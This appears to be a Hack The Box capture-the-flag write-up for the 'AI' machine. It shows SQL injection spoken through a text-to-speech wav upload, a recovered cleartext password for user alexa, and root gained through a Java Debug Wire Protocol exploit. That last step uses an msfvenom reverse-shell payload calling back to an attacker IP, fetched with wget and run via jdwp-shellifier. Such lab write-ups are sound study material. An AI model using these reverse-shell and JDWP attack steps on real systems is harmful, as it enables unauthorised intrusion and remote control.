@@ -1,0 +1,57 @@
+I"�	<p><img src="/htb_box/img/2020-02-28-08-35-31.png" alt="" /></p>
+<h1 id="ai">AI</h1>
+<ul>
+  <li><a href="#ai">AI</a>
+    <ul>
+      <li><a href="#enumeration">Enumeration</a></li>
+      <li><a href="#exploits---work">Exploits - Work</a></li>
+      <li><a href="#user">User</a></li>
+      <li><a href="#privesc">PrivEsc</a></li>
+      <li><a href="#root">Root</a>
+        <h2 id="enumeration">Enumeration</h2>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<p>Exploring the website there is a page with an upload a wav file to query. First trying to stego a wav file which gave nothing I gave tts a try. Text to Speech synth is used for vehicles, mobile phones, and IOT devices like Alexa.
+Trying numerous websites, https://www.text2speech.org/ which gave inconsistent results I installed festival which gave better results.</p>
+
+<h2 id="exploits---work">Exploits - Work</h2>
+<p>Using basic sqli in text the file is converted to a wav file</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Open single quote, join,SELECT, password, from, users, comment database
+text2wave dbstuff -o might.wav -scale 1.2
+alexa - H,Sq9t6}a&lt;)?q93_
+</code></pre></div></div>
+
+<p><img src="/htb_box/img/2019-11-18-11-23-17.png" alt="" /></p>
+
+<p>Using the credentials I ssh into the box to get user.</p>
+
+<h2 id="privesc">PrivEsc</h2>
+
+<p>Basic enumeration reveals root is running a tomcat instance using java debug wire protocol which is exploitable.</p>
+
+<p>https://ioactive.com/hacking-java-debug-wire-protocol-or-how/</p>
+
+<p>First due to the jdwp being localhost I had to port forward</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -N -L 8000:127.0.0.1:8000 alexa@10.10.10.163
+</code></pre></div></div>
+
+<p>With that and the script I execute the script changing the method to “java.lang.String.indexOf”</p>
+
+<p>In order to get a shell I must first generate an elf venom like so…</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.16.99 LPORT=4681 -f elf -o crypto4681
+</code></pre></div></div>
+
+<p>Wget this to the tmp directory on AI chmod +x to make it executable, start a listener locally, and then run the exploit</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python jdwp-shellifier.py -t 127.0.0.1 --break-on "java.lang.String.indexOf" --cmd "/tmp/crypto4681"
+</code></pre></div></div>
+
+<p><img src="/htb_box/img/AI.md.png" alt="" /></p>
+
+:ET
